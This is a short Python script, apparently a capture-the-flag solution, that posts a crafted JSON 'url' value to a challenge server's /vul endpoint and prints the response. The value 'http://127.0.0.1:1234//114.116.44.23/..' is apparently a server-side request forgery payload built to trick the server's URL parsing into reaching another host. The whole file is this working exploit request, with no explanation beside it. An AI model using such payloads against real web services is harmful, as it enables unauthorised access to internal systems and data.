import requests

# challenge url
url = "http://122.112.246.208:20002/vul"
session = requests.Session()

rawBody = "{\"url\":\"http://127.0.0.1:1234//114.116.44.23/..\"}"
headers = {"Content-Type":"application/json"}

response = session.post(url, data=rawBody, headers=headers)

print("Status code:   %i" % response.status_code)
print("Response body: %s" % response.content)

